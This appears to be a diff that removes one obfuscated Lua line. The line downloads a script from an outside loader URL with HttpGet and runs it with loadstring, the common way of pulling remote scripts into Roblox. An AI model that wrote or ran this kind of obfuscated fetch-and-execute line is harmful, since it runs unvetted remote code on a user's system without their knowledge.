@@ -1,1 +1,0 @@
-trxktqvaCALL((trxktqvaCALL((loadstring),trxktqvaNAMECALL(game,"HttpGet","https://api.luarmor.net/files/v3/loaders/fda9babd071d6b536a745774b6bc681c.lua"))));
